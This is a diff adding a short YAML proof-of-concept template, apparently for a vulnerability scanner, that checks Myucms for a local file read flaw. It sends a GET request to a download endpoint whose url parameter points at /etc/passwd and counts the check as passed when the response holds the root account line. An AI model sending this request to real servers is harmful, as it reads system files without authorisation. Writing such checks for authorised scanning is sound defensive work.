@@ -1,0 +1,21 @@
+id: poc-yaml-myucms-lfr
+info:
+  name: Myucms 本地文件读取漏洞
+  severity: medium
+  tags:
+  - 文件读取
+  finger: Myucms
+  reference: []
+  description: null
+variables: {}
+transport: http
+requests:
+- method: GET
+  path: /index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1
+  headers: {}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && matches(body, "root:[x*]:0:0:")
+  output: []
